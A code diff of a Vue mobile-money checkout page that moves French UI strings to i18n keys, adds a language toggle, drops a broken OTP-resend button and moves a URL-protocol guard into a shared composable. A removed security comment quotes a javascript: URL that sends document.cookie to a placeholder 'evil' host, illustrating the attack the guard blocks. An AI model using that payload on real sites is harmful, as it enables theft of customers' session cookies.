@@ -21,12 +21,12 @@ const {
   getSession,
   processPayment,
   checkStatus,
-  resendOtp,
   emailReceipt,
   downloadReceiptUrl,
   formatAmount,
 } = useCheckout()
 const { resolveFailureCopy } = useFailureCopy()
+const { t, locale } = useI18n()
 
 /**
  * 16-state state machine driven by the backend `/status` payload + the
@@ -68,7 +68,7 @@ const redirectingTo = ref<string | null>(null)
 useHead({
   title: () => {
     const m = session.value?.merchant?.name
-    return m ? `Paiement chez ${m}` : 'Paiement sécurisé'
+    return m ? t('checkout.head.titleWithMerchant', { merchant: m }) : t('checkout.head.titleDefault')
   },
 })
 
@@ -232,7 +232,7 @@ async function fetchSession() {
       pageState.value = 'session_unknown'
     } else {
       pageState.value = 'error'
-      error.value = 'Impossible de charger la session de paiement.'
+      error.value = t('checkout.error.sessionLoadFailed')
     }
   } finally {
     loading.value = false
@@ -277,7 +277,7 @@ async function handleSubmit() {
   phoneError.value = ''
 
   if (!selectedOperator.value) {
-    formError.value = 'Veuillez sélectionner un opérateur de paiement.'
+    formError.value = t('checkout.form.errorSelectOperator')
     return
   }
 
@@ -286,15 +286,15 @@ async function handleSubmit() {
     const fmt = phoneFormat.value
     if (!phone.value || phone.value.length < 6) {
       phoneError.value = fmt?.national_hint
-        ? `Format attendu : ${fmt.national_hint}.`
-        : 'Veuillez entrer un numéro de téléphone valide.'
+        ? t('checkout.form.errorExpectedFormat', { hint: fmt.national_hint })
+        : t('checkout.form.errorInvalidPhone')
       return
     }
     if (fmt?.national_regex) {
       try {
         const re = new RegExp(fmt.national_regex)
         if (!re.test(phone.value)) {
-          phoneError.value = `Numéro invalide pour cet opérateur. Format attendu : ${fmt.national_hint}.`
+          phoneError.value = t('checkout.form.errorInvalidPhoneForOperator', { hint: fmt.national_hint })
           return
         }
       } catch {
@@ -304,7 +304,7 @@ async function handleSubmit() {
   }
 
   if (otpRequired.value && (!otp.value || otp.value.trim().length < 4)) {
-    formError.value = 'Veuillez saisir le code de paiement (OTP).'
+    formError.value = t('checkout.form.errorOtpRequired')
     return
   }
 
@@ -374,7 +374,7 @@ async function handleSubmit() {
       })()
       if (!validatedUrl) {
         pageState.value = 'failed'
-        formError.value = "URL de redirection invalide. Recommencez ou contactez le marchand."
+        formError.value = t('checkout.form.errorInvalidRedirectUrl')
         return
       }
       redirectingTo.value = validatedUrl.host
@@ -417,7 +417,7 @@ async function handleSubmit() {
       pageState.value = 'failed'
     } else {
       pageState.value = 'failed'
-      formError.value = data?.message || 'Une erreur est survenue lors du traitement.'
+      formError.value = data?.message || t('checkout.error.processingFailed')
     }
   } finally {
     if (submitToken === currentSubmitToken) {
@@ -673,24 +673,10 @@ function handleSwitchMethod() {
 // on `failed` with no visible OTP input. Now we route back, clear
 // the stale code, and surface errors in a screen-level ref so they
 // render inside CheckoutStateScreen.
-const resendError = ref('')
-async function handleResendOtp() {
-  resendError.value = ''
-  try {
-    await resendOtp(token)
-    formError.value = ''
-    otp.value = ''
-    pageState.value = 'awaiting_otp'
-  } catch (e: any) {
-    resendError.value = e?.data?.message
-      ?? "Impossible de renvoyer le code. Recommencez le paiement ou changez d'opérateur."
-  }
-}
-
 async function handleEmailReceipt() {
   const target = receiptEmail.value || session.value?.customer_email
   if (!target) {
-    formError.value = 'Saisissez une adresse email pour recevoir le reçu.'
+    formError.value = t('checkout.receipt.errorEmailRequired')
     return
   }
   try {
@@ -698,31 +684,14 @@ async function handleEmailReceipt() {
     receiptEmailSent.value = true
     setTimeout(() => { receiptEmailSent.value = false }, 3000)
   } catch {
-    formError.value = "Impossible d'envoyer le reçu pour le moment."
+    formError.value = t('checkout.receipt.errorEmailSendFailed')
   }
 }
 
-/**
- * Safely navigate to a merchant-controlled URL (return_url / cancel_url).
- * R2 audit HIGH: validate the protocol is http(s) before assigning to
- * `window.location.href` — a hostile merchant typing
- * `javascript:fetch('https://evil/?c='+document.cookie)` in their
- * dashboard would otherwise execute on every customer's success
- * screen. Defence-in-depth: the backend Laravel `|url` validator
- * accepts `javascript:` URLs (CVE-2014-1474 territory) so we MUST
- * re-validate client-side before navigating.
- */
-function navigateSafely(url: string | null | undefined): boolean {
-  if (!url) return false
-  try {
-    const u = new URL(url)
-    if (!['http:', 'https:'].includes(u.protocol)) return false
-    window.location.href = u.href
-    return true
-  } catch {
-    return false
-  }
-}
+// Safe navigation to merchant-controlled return_url / cancel_url. The
+// protocol guard lives in a shared composable so the main checkout and the
+// KKiaPay flow can never drift apart. See useSafeNavigation for why.
+const { navigateSafely } = useSafeNavigation()
 
 function redirectToReturn() {
   cancelAutoRedirect()
@@ -900,14 +869,17 @@ function runFailureCta(action: string) {
       handleSwitchMethod()
       break
     case 'request_new_otp':
-      handleResendOtp()
+      // No driver supports OTP resend; restart the payment instead so the
+      // customer gets a genuinely fresh code.
+      handleSwitchMethod()
       break
     case 'cancel':
       redirectToCancel()
       break
     case 'contact_merchant':
       if (session.value?.merchant?.support_email) {
-        window.location.href = `mailto:${session.value.merchant.support_email}?subject=Paiement%20${session.value?.transaction_public_id || ''}`
+        const subject = encodeURIComponent(t('checkout.failure.contactSubject', { reference: session.value?.transaction_public_id || '' }))
+        window.location.href = `mailto:${session.value.merchant.support_email}?subject=${subject}`
       }
       break
   }
@@ -921,8 +893,13 @@ function runFailureCta(action: string) {
          the visual hierarchy starts. The visible card headings stay
          at h2/h3. -->
     <h1 class="visually-hidden">
-      Paiement{{ session?.merchant?.name ? ` chez ${session.merchant.name}` : '' }}
+      {{ session?.merchant?.name ? t('checkout.heading.paymentWithMerchant', { merchant: session.merchant.name }) : t('checkout.heading.paymentBare') }}
     </h1>
+
+    <!-- Customer-facing language selector (FR / EN). -->
+    <div class="checkout-lang-row">
+      <CheckoutLangToggle />
+    </div>
 
     <!-- Sandbox banner — promoted from corner badge to full-width strip
          so dev/QA can never miss it. R1 audit A11y V14: role="region"
@@ -932,9 +909,9 @@ function runFailureCta(action: string) {
       v-if="session?.environment === 'sandbox'"
       class="sandbox-banner"
       role="region"
-      aria-label="Mode test"
+      :aria-label="t('checkout.sandbox.ariaLabel')"
     >
-      <strong>MODE TEST</strong> — aucun montant ne sera prélevé. N'utilisez pas un vrai numéro pour ce paiement.
+      <strong>{{ t('checkout.sandbox.badge') }}</strong> : {{ t('checkout.sandbox.notice') }}
     </div>
 
     <!-- Header lives INSIDE the card now (Moneroo convention).
@@ -947,7 +924,7 @@ function runFailureCta(action: string) {
       <CheckoutStateScreen
         v-if="pageState === 'loading'"
         variant="loading"
-        title="Chargement de votre paiement…"
+        :title="t('checkout.state.loadingTitle')"
       />
 
       <!-- Form (Step 1 + Step 2 dispatched to template) -->
@@ -1024,22 +1001,22 @@ function runFailureCta(action: string) {
       <CheckoutStateScreen
         v-else-if="pageState === 'validating'"
         variant="processing"
-        title="Préparation de votre paiement…"
-        message="Vérification de vos informations."
+        :title="t('checkout.state.validatingTitle')"
+        :message="t('checkout.state.validatingMessage')"
       />
 
       <CheckoutStateScreen
         v-else-if="pageState === 'redirecting'"
         variant="redirecting"
-        title="Redirection vers la page sécurisée…"
-        :message="redirectingTo ? `Vers ${redirectingTo}` : 'Veuillez patienter.'"
+        :title="t('checkout.state.redirectingTitle')"
+        :message="redirectingTo ? t('checkout.state.redirectingMessageTo', { host: redirectingTo }) : t('checkout.state.redirectingMessageWait')"
       />
 
       <CheckoutStateScreen
         v-else-if="pageState === 'processing'"
         variant="processing"
-        title="Confirmez sur votre téléphone"
-        message="Saisissez votre code PIN Mobile Money pour valider le paiement. Cette page se mettra à jour automatiquement."
+        :title="t('checkout.state.processingTitle')"
+        :message="t('checkout.state.processingMessage')"
       >
         <!-- R2 audit HIGH UX: previously these in-flight screens had
              zero recovery CTAs — the customer was stuck staring at a
@@ -1047,10 +1024,10 @@ function runFailureCta(action: string) {
              "abandon and pick another method" escape hatch. -->
         <template #actions>
           <button type="button" class="ck-state-cta ck-state-cta--secondary" @click="manualStatusCheck">
-            Vérifier maintenant
+            {{ t('checkout.action.checkNow') }}
           </button>
           <button type="button" class="ck-state-link" @click="handleSwitchMethod">
-            Annuler et changer de moyen
+            {{ t('checkout.action.cancelChangeMethod') }}
           </button>
         </template>
       </CheckoutStateScreen>
@@ -1058,18 +1035,18 @@ function runFailureCta(action: string) {
       <CheckoutStateScreen
         v-else-if="pageState === 'awaiting_ussd'"
         variant="awaiting_ussd"
-        title="Validez sur votre téléphone"
-        :message="nextAction?.message || 'Composez le code reçu pour finaliser le paiement.'"
+        :title="t('checkout.state.ussdTitle')"
+        :message="nextAction?.message || t('checkout.state.ussdMessageDefault')"
       >
         <p v-if="nextAction?.ussdCode" class="ussd-code">
-          Code à composer : <strong>{{ nextAction.ussdCode }}</strong>
+          {{ t('checkout.state.ussdCodeToDial') }} <strong>{{ nextAction.ussdCode }}</strong>
         </p>
         <template #actions>
           <button type="button" class="ck-state-cta ck-state-cta--secondary" @click="manualStatusCheck">
-            J'ai composé le code
+            {{ t('checkout.action.iDialedCode') }}
           </button>
           <button type="button" class="ck-state-link" @click="handleSwitchMethod">
-            Annuler et changer de moyen
+            {{ t('checkout.action.cancelChangeMethod') }}
           </button>
         </template>
       </CheckoutStateScreen>
@@ -1077,8 +1054,8 @@ function runFailureCta(action: string) {
       <CheckoutStateScreen
         v-else-if="pageState === 'awaiting_otp'"
         variant="awaiting_otp"
-        title="Saisissez le code SMS"
-        :message="`Un code de confirmation a été envoyé au ${phoneFormat?.dial_code ? '+' + phoneFormat.dial_code : ''} ${phone}.`"
+        :title="t('checkout.state.otpTitle')"
+        :message="t('checkout.state.otpMessage', { phone: `${phoneFormat?.dial_code ? '+' + phoneFormat.dial_code : ''} ${phone}`.trim() })"
       >
         <div class="otp-form">
           <input
@@ -1087,21 +1064,19 @@ function runFailureCta(action: string) {
             inputmode="numeric"
             autocomplete="one-time-code"
             maxlength="8"
-            placeholder="Code à 6 chiffres"
+            :placeholder="t('checkout.form.otpPlaceholder')"
             class="ck-otp-large"
-            aria-label="Code de confirmation reçu par SMS"
+            :aria-label="t('checkout.form.otpAriaLabel')"
           />
-          <!-- R2 audit MED N1: previously `resendError` was assigned in
-               script but never rendered in the template — the user
-               saw silent failure on resend. -->
-          <p v-if="resendError" class="ck-form-error" role="alert">
-            {{ resendError }}
-          </p>
           <button type="button" class="ck-state-cta" @click="handleSubmit">
-            Valider
+            {{ t('checkout.action.validate') }}
           </button>
-          <button type="button" class="ck-state-link" @click="handleResendOtp">
-            Renvoyer le code
+          <!-- "Resend code" was removed: no aggregator driver implements
+               resendOtp, so the endpoint always 422s. Restarting the
+               payment (operator re-selection) is the working recovery
+               path that actually triggers a fresh code. -->
+          <button type="button" class="ck-state-link" @click="handleSwitchMethod">
+            {{ t('checkout.action.changePaymentMethod') }}
           </button>
         </div>
       </CheckoutStateScreen>
@@ -1109,15 +1084,15 @@ function runFailureCta(action: string) {
       <CheckoutStateScreen
         v-else-if="pageState === 'polling_stale'"
         variant="polling_stale"
-        title="Cela prend plus longtemps que prévu"
-        message="Si vous avez validé sur votre téléphone, le paiement peut être en cours de traitement par l'opérateur. Nous continuons à vérifier."
+        :title="t('checkout.state.staleTitle')"
+        :message="t('checkout.state.staleMessage')"
       >
         <template #actions>
           <button type="button" class="ck-state-cta ck-state-cta--secondary" @click="manualStatusCheck">
-            Vérifier maintenant
+            {{ t('checkout.action.checkNow') }}
           </button>
           <button type="button" class="ck-state-link" @click="handleSwitchMethod">
-            Abandonner
+            {{ t('checkout.action.abandon') }}
           </button>
         </template>
       </CheckoutStateScreen>
@@ -1142,18 +1117,18 @@ function runFailureCta(action: string) {
                 rel="noopener"
                 class="ck-state-cta ck-state-cta--secondary"
               >
-                Télécharger le reçu
+                {{ t('checkout.receipt.download') }}
               </a>
               <div class="receipt-email-row">
                 <input
                   v-model="receiptEmail"
                   type="email"
                   inputmode="email"
-                  :placeholder="session?.customer_email || 'votre@email.com'"
+                  :placeholder="session?.customer_email || t('checkout.receipt.emailPlaceholder')"
                   class="ck-state-input"
                 />
                 <button type="button" class="ck-state-cta ck-state-cta--secondary" @click="handleEmailReceipt">
-                  {{ receiptEmailSent ? 'Envoyé ✓' : 'Envoyer par email' }}
+                  {{ receiptEmailSent ? t('checkout.receipt.emailSent') : t('checkout.receipt.sendByEmail') }}
                 </button>
               </div>
               <button
@@ -1162,7 +1137,7 @@ function runFailureCta(action: string) {
                 class="ck-state-cta"
                 @click="redirectToReturn"
               >
-                Retourner sur le site
+                {{ t('checkout.action.returnToSite') }}
               </button>
             </template>
           </CheckoutReceipt>
@@ -1173,8 +1148,8 @@ function runFailureCta(action: string) {
       <CheckoutStateScreen
         v-else-if="pageState === 'failed'"
         variant="failed"
-        :title="failureCopy?.title || 'Paiement échoué'"
-        :message="failureCopy?.body || formError || 'Le paiement n\'a pas pu être effectué.'"
+        :title="failureCopy?.title || t('checkout.state.failedTitle')"
+        :message="failureCopy?.body || formError || t('checkout.state.failedMessage')"
         :reference="session?.transaction_public_id"
       >
         <template #actions>
@@ -1200,7 +1175,7 @@ function runFailureCta(action: string) {
             class="ck-state-cta"
             @click="handleRetry"
           >
-            Réessayer
+            {{ t('checkout.action.retry') }}
           </button>
         </template>
       </CheckoutStateScreen>
@@ -1208,15 +1183,15 @@ function runFailureCta(action: string) {
       <CheckoutStateScreen
         v-else-if="pageState === 'aggregator_down'"
         variant="aggregator_down"
-        title="Service de paiement indisponible"
-        :message="failureCopy?.body || 'Le service est temporairement indisponible. Essayez un autre moyen de paiement.'"
+        :title="t('checkout.state.aggregatorDownTitle')"
+        :message="failureCopy?.body || t('checkout.state.aggregatorDownMessage')"
       >
         <template #actions>
           <button type="button" class="ck-state-cta" @click="handleSwitchMethod">
-            Changer d'opérateur
+            {{ t('checkout.action.changeOperator') }}
           </button>
           <button type="button" class="ck-state-cta ck-state-cta--secondary" @click="handleRetry">
-            Réessayer
+            {{ t('checkout.action.retry') }}
           </button>
         </template>
       </CheckoutStateScreen>
@@ -1224,8 +1199,8 @@ function runFailureCta(action: string) {
       <CheckoutStateScreen
         v-else-if="pageState === 'timeout'"
         variant="timeout"
-        title="Délai dépassé"
-        :message="`Si le débit apparaît sur votre compte, contactez ${session?.merchant?.name || 'le marchand'} avec la référence ci-dessous.`"
+        :title="t('checkout.state.timeoutTitle')"
+        :message="t('checkout.state.timeoutMessage', { merchant: session?.merchant?.name || t('checkout.common.theMerchant') })"
         :reference="session?.transaction_public_id"
       >
         <template #actions>
@@ -1238,7 +1213,7 @@ function runFailureCta(action: string) {
             class="ck-state-cta"
             @click="redirectToTerminalExit"
           >
-            Revenir au site
+            {{ t('checkout.action.backToSite') }}
           </button>
         </template>
       </CheckoutStateScreen>
@@ -1246,8 +1221,8 @@ function runFailureCta(action: string) {
       <CheckoutStateScreen
         v-else-if="pageState === 'merchant_cancelled'"
         variant="merchant_cancelled"
-        title="Paiement annulé"
-        :message="`Ce paiement a été annulé par ${session?.merchant?.name || 'le marchand'}. Aucun montant ne vous sera prélevé.`"
+        :title="t('checkout.state.cancelledTitle')"
+        :message="t('checkout.state.cancelledMessage', { merchant: session?.merchant?.name || t('checkout.common.theMerchant') })"
       >
         <template #actions>
           <button
@@ -1256,7 +1231,7 @@ function runFailureCta(action: string) {
             class="ck-state-cta"
             @click="redirectToTerminalExit"
           >
-            Revenir au site
+            {{ t('checkout.action.backToSite') }}
           </button>
         </template>
       </CheckoutStateScreen>
@@ -1264,8 +1239,8 @@ function runFailureCta(action: string) {
       <CheckoutStateScreen
         v-else-if="pageState === 'expired'"
         variant="expired"
-        title="Session expirée"
-        message="Cette session de paiement a expiré. Retournez sur le site du marchand pour en créer une nouvelle."
+        :title="t('checkout.state.expiredTitle')"
+        :message="t('checkout.state.expiredMessage')"
       >
         <template #actions>
           <button
@@ -1274,7 +1249,7 @@ function runFailureCta(action: string) {
             class="ck-state-cta"
             @click="redirectToTerminalExit"
           >
-            Revenir au site
+            {{ t('checkout.action.backToSite') }}
           </button>
         </template>
       </CheckoutStateScreen>
@@ -1282,19 +1257,19 @@ function runFailureCta(action: string) {
       <CheckoutStateScreen
         v-else-if="pageState === 'session_unknown'"
         variant="session_unknown"
-        title="Lien introuvable"
-        message="Le lien de paiement est invalide ou a expiré. Demandez un nouveau lien au marchand."
+        :title="t('checkout.state.sessionUnknownTitle')"
+        :message="t('checkout.state.sessionUnknownMessage')"
       />
 
       <CheckoutStateScreen
         v-else-if="pageState === 'error'"
         variant="error"
-        title="Erreur technique"
-        :message="error || 'Une erreur inattendue est survenue. Veuillez recharger la page.'"
+        :title="t('checkout.state.errorTitle')"
+        :message="error || t('checkout.state.errorMessage')"
       >
         <template #actions>
           <button type="button" class="ck-state-cta" @click="fetchSession">
-            Recharger
+            {{ t('checkout.action.reload') }}
           </button>
         </template>
       </CheckoutStateScreen>
@@ -1349,6 +1324,15 @@ function runFailureCta(action: string) {
   flex-direction: column;
   align-items: center;
   justify-content: center;
+}
+
+.checkout-lang-row {
+  width: 100%;
+  max-width: var(--ck-card-max-width);
+  margin: 0 auto;
+  display: flex;
+  justify-content: flex-end;
+  padding: var(--ck-sp-2) var(--ck-sp-2) 0;
 }
 
 .sandbox-banner {
